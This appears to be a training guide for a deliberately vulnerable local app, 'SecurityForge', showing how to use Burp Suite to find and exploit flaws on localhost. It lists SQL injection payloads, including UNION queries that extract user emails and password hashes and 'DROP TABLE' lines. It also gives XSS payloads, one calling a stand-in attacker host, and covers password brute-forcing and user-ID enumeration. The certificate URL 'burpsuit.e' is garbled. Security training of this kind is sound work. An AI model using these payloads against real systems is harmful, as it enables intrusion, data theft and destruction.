# SecurityForge - Burp Suite Integration Guide

## 📌 TABLE OF CONTENTS

1. [Installation & Setup](#installation--setup)
2. [Burp Interface Overview](#burp-suite-interface-overview)
3. [Configuring Target](#configuring-target-scope)
4. [SQLi Active Scanning](#sqli-active-scanning)
5. [XSS Scanning & Exploitation](#xss-scanning--exploitation)
6. [Intruder - Brute Force & Parameter Fuzzing](#intruder---brute-force--parameter-fuzzing)
7. [Repeater - Manual Testing](#repeater---manual-exploitation)
8. [Macros & Automation](#macros--session-handling)
9. [Extensions & Plugins](#extensions--plugins)
10. [API Scanning](#api-scanning-mode)
11. [Report Generation](#report-generation)
12. [Batch Scanning](#batch-scanning-automation)

---

## 🛠️ INSTALLATION & SETUP

### **Step 1: Download Burp Community Edition** (Free)

```
1. Visit: https://portswigger.net/burp/communitydownload
2. Download for your OS (Windows/Mac/Linux)
3. Install and launch
4. Create free account or use community edition
```

### **Step 2: Configure Browser Proxy**

```
Burp → Proxy tab:
1. Check "Intercept is on"
2. Browser → Set proxy:
   - HTTP Proxy: 127.0.0.1
   - Port: 8080

3. Import Burp certificate:
   - Visit http://burpsuit.e
   - Download certificate
   - Install in browser's trusted CAs
```

### **Step 3: Add Target to Scope**

```
1. Burp → Target tab → Scope sub-tab
2. Click "Add"
3. Enter:
   - Protocol: http
   - Host: localhost
   - Port: 5000
   - Path: /api
4. Click "OK"
```

---

## 🔍 BURP SUITE INTERFACE OVERVIEW

### **Key Tabs Explained**

| Tab | Purpose | Usage |
|-----|---------|-------|
| **Proxy** | Intercept requests | MITM, modify requests live |
| **Target** | Scope & site map | Define what to test, view structure |
| **Scanner** | Automated scanning | Active/Passive vulnerability scan |
| **Intruder** | Payload fuzzing | Brute force, parameter injection |
| **Repeater** | Manual testing | Craft & re-send requests |
| **Decoder** | Encoding/decoding | Base64, URL, JWT decode |
| **Extender** | Add plugins | Install community extensions |

---

## 🎯 CONFIGURING TARGET SCOPE

### **Step 1: Define Target**

```
1. Proxy tab → Intercept request from browser
2. Right-click request → Send to Target
3. Target tab → Scope sub-tab
4. View "Included in scope"
```

### **Step 2: Add Scope Rules**

```
Target → Scope → Add:
  Protocol: http
  Host: localhost
  Port: 5000
  Path: /api/.*  (regex: all API endpoints)
```

### **Step 3: Site Map**

```
Target → Site map shows:
  ├── http://localhost:5000
  │  ├── /api
  │  │  ├── /auth/login (POST)
  │  │  ├── /auth/register (POST)
  │  │  ├── /users (GET)
  │  │  ├── /users/1 (GET)
  │  │  ├── /search (GET) ← SQLi here
  │  │  ├── /comments (POST) ← XSS here
  │  │  └── /fetch-resource (POST) ← SSRF here
  │  └── /dashboard
```

---

## 🔓 SQLI ACTIVE SCANNING

### **Method 1: Automatic Active Scan**

```
Step 1: Browse vulnerable endpoint through Burp
  1. Proxy intercepts request to /api/search?product=laptop
  2. Right-click → Send to Scanner
  
Step 2: Configure Scanner
  1. Scanner tab → Active scan
  2. Click "Scan"
  3. Configure:
     - Scan type: "Crawl and audit"
     - Scan scope: "In scope"
     - Active scanning checks: Enable all
     
Step 3: Review Results
  Scanner → Issues:
    🔴 [High] SQL injection found
       Location: GET /api/search
       Parameter: product
       Payload: admin' OR '1'='1
```

---

### **Method 2: Manual Testing with Repeater**

```
Step 1: Send request to Repeater
  1. Intercept request with Proxy
  2. Right-click → Send to Repeater
  3. Repeater tab opens with request

Step 2: Modify Parameter
  GET /api/search?product=admin' OR '1'='1
  
Step 3: Execute & Compare
  - Click "Send"
  - Compare with normal request
  - Look for error messages, timing differences

Step 4: Test Different Payloads
  Right panel shows response difference
```

---

### **Method 3: Intruder - SQLi Payload Injection**

```
Step 1: Send to Intruder
  1. Intercept request
  2. Right-click → Send to Intruder
  3. Intruder tab opens
  
Step 2: Mark Injection Point
  Auto-select parameter: product=§laptop§
  (§ marks injection point)
  
Step 3: Load Payload List
  1. Intruder → Payloads sub-tab
  2. Select "Simple list"
  3. Load payload file: sql_injection_payloads.txt
  
  Payloads include:
  - admin' --
  - ' OR '1'='1' --
  - 1' AND SLEEP(5) --
  - 1' UNION SELECT NULL, NULL --
  - 1'; DROP TABLE users; --
  
Step 4: Configure Attack
  1. Attack type: "Cluster bomb" or "Sniper"
  2. Options:
     - Number of threads: 10
     - Pause between requests: 100ms
  
Step 5: Launch Attack
  1. Click "Start attack"
  2. View results:
     - Response length > normal = SQLi likely
     - Response time > 5s = Time-based SQLi
     - Error messages = Error-based SQLi
```

---

## 🔓 XSS SCANNING & EXPLOITATION

### **Method 1: Passive XSS Detection**

```
Burp Scanner will automatically detect:
  ✅ Reflected XSS (input echoed in output)
  ✅ DOM-based XSS (JavaScript manipulation)
  ✅ Stored XSS (persisted in database)
  
Results shown as:
  🔴 [High] Reflected XSS in GET parameter
     Location: /api/search
     Parameter: q
     Payload: <img src=x onerror=alert(1)>
```

---

### **Method 2: Manual XSS Testing in Repeater**

```
Step 1: Test Reflected XSS
  GET /api/search?q=<img src=x onerror=alert('XSS')>
  
  Vulnerable if response includes: <img src=x onerror=alert('XSS')>
  (unescaped)

Step 2: Test Stored XSS
  POST /api/comments
  {"comment": "<script>fetch('http://attacker.com')</script>"}
  
  Then GET /api/comments to verify persistence

Step 3: Test DOM XSS
  GET /dashboard?username=<img src=x onerror=alert(1)>
  
  Check if JavaScript processes the parameter
```

---

## 🔓 INTRUDER - BRUTE FORCE & PARAMETER FUZZING

### **SQLi Parameter Fuzzing**

```
Step 1: Identify parameters
  GET /api/products?id=§1§&category=§laptop§&sort=§name§
  
  Mark multiple injection points with § 

Step 2: Configure Attack Type
  Attack type: "Cluster bomb"
  - Position 1: id values (1,2,3,4,5)
  - Position 2: SQL payloads (OR 1=1, UNION SELECT...)
  - Position 3: column names (id, name, price)

Step 3: Define Payloads
  Payload Set 1 (id):
    1
    2
    3
    999
  
  Payload Set 2 (SQL injection):
    ' OR '1'='1
    ' UNION SELECT NULL, NULL --
    '; DROP TABLE products; --
    ' AND SLEEP(5) --
  
  Payload Set 3 (columns):
    id
    name
    price
    secret

Step 4: Analyze Results
  - Response length anomalies
  - Error messages
  - Response time delays
  - Successful table drop (500 errors)
```

---

### **Authentication Bypass Fuzzing**

```
Step 1: Create Intruder request
  POST /api/login
  username=admin&password=§password§

Step 2: Load password wordlist
  File: common_passwords.txt
  Contains:
    password123
    admin
    12345
    qwerty
    letmein
    ...

Step 3: Configure Options
  - Thread count: 20 (fast)
  - Grep match: "success" or "token"
  
Step 4: Launch & review
  Results filtered by:
    - Response code 200 = possible success
    - Response contains "token" = auth bypass
    - Response contains "admin" = privilege escalation
```

---

###  **BOLA Parameter Fuzzing**

```
Step 1: User enumeration
  GET /api/users/§user_id§
  
  Inject:
    1,2,3,4,5,10,50,100,999
  
  Results show:
    - 200 responses = valid users
    - 404 responses = non-existent users

Step 2: Order enumeration
  POST /api/users/1/orders/§order_id§
  
  Inject:
    1,2,3,10,100,1000
  
  Vulnerable if:
    - Same orders returned for different users
    - Response contains other user's data
```

---

## ✏️ REPEATER - MANUAL EXPLOITATION

### **SQLi Exploitation Workflow**

```
Step 1: Basic injection test
  GET /api/search?product=laptop' OR '1'='1 --
  
  Send & check:
    - Response length (should be larger - all products)
    - Error messages
    - Timing

Step 2: Determine columns
  ' UNION SELECT NULL --        (1 column?)
  ' UNION SELECT NULL, NULL --  (2 columns?)
  ' UNION SELECT NULL, NULL, NULL -- (3 columns?)
  
  First successful query = correct column count

Step 3: Database reconnaissance
  ' UNION SELECT database(), user(), version() --
  
  Response reveals:
    - Database name: "securityforge"
    - Current user: "root"
    - MySQL version: "5.7"

Step 4: Extract table names
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --
  
  Results:
    - users
    - orders
    - products
    - comments

Step 5: Extract column names
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
  
  Results:
    - id
    - email
    - password
    - role
    - is_admin

Step 6: Extract data
  ' UNION SELECT email, password FROM users --
  
  Results:
    admin@securityforge.com | $2b$12$abc123...
    user1@securityforge.com | hashed_pass...
```

---

## 🤖 MACROS & SESSION HANDLING

### **Create Authentication Macro**

```
Burp → Options → Session handling rules:

1. Click "Add"
2. Select "Session handling and token-based authentication"
3. Configure macro:
   - Click "Add" in Recording section
   - Intercept login request
   - POST /api/login
   - Extract token from response:
     - Regular expression: "access_token":"([^"]+)"
   - Click "OK"

4. Token location:
   - Parameter name: auth_token
   - Type: Header
   - Header name: Authorization
   - Header value: Bearer {extracted_token}

5. Scope:
   - Check "Scope" →.Include "http://localhost:5000"
```

### **Auto-Refresh Expired Tokens**

```
Rules:

Condition: HTTP response 401 or 403
Action: Re-execute macro (auto re-login)
Then: Re-send original request with new token
```

---

## 🔌 EXTENSIONS & PLUGINS

### **Essential Extensions for SecurityForge**

```
Burp Extender tab → BApp Store:

1. Decoder++
   - Better encoding/decoding
   - Multiple formats

2. Active Scan++
   - Additional SQLi checks
   - Custom injection points

3. Burp Bounty
   - Custom issue definitions
   - Custom scanner checks

4. Collaborator
   - Out-of-band detection
   - SSRF/XXE/RCE verification

5. Autorize
   - Automatic authorization bypass testing
   - Test all endpoints as different roles

6. Turbo Burp
   - Faster scanning
   - Parallel requests
```

---

## 📊 API SCANNING MODE

### **Step 1: Import API Definition**

```
1. Burp → Dashboard tab
2. Click "Import API definition"
3. Select:
   - Format: OpenAPI 3.0 / Swagger 2.0
   - File: securityforge-api.yaml
   
4. Burp creates site map with all endpoints
```

### **Step 2: Configure API Scanning**

```
1. Target → Scope:
   - Enable "Include in scope": /api/*
   
2. Scanner / Options:
   - Active scanning checks:
     ✅ SQL injection
     ✅ XXE
     ✅ SSRF
     ✅ XSS
     ✅ Authentication bypass
     ✅ BOLA
```

### **Step 3: Scan API**

```
1. Target → Site map
2. Right-click "/api" folder
3. "Send to Scanner"
4. Scanner: Active scan
5. Configure:
   - Insert point: "All"
   - Scan type: "Detailed"
   
Results show:
  🔴 Vulnerabilities found:
     - SQL injection in /api/search
     - BOLA in /api/users/{id}/orders
     - XXE in /api/parse-xml
```

---

## 📋 REPORT GENERATION

### **Generate Detailed Report**

```
1. Scanner / Issues:
   - Review all issues found
   
2. Report → Generate report:
   - Report type: "Detailed"
   - Severity: Include all
   - Include: Requests, responses, remediation
   
3. Export format:
   - PDF (for management)
   - HTML (for review)
   - XML (for parsing)
```

---

## 🔄 BATCH SCANNING AUTOMATION

### **Burp Pro Feature (Not in Community Edition)**

```
For community edition, use command-line tools:

1. Install Burp's command-line scanner
2. Create scan config JSON
3. Run automated scans via script
```

### **Manual Batch Approach**

```
1. Create list of endpoints to scan
2. For each endpoint:
   - Send to Proxy
   - Send to Scanner
   - Let scan complete
   - Export results

3. Aggregate results in master spreadsheet
```

---

## 📋 TESTING CHECKLIST

### **For Each Endpoint**

- [ ] Send through proxy (active interception)
- [ ] Check Burp site map for endpoint
- [ ] Send to Scanner for passive scan
- [ ] Send request to Repeater
- [ ] Test parameter manipulation
- [ ] Test SQLi payloads
- [ ] Test XSS payloads
- [ ] Check authentication/authorization
- [ ] Test with different user roles
- [ ] Review all Proxy history

### **Common Findings to Look For**

- [ ] SQL Injection (Intruder testing)
- [ ] XSS (Reflected, Stored, DOM)
- [ ] BOLA (Different user IDs)
- [ ] SSRF (Internal URLs)
- [ ] XXE (XML parsing)
- [ ] Authentication bypass
- [ ] Weak TLS/SSL
- [ ] Information disclosure
- [ ] Missing security headers

---

**Next: → See OWASP_ZAP_GUIDE.md for automated scanning**

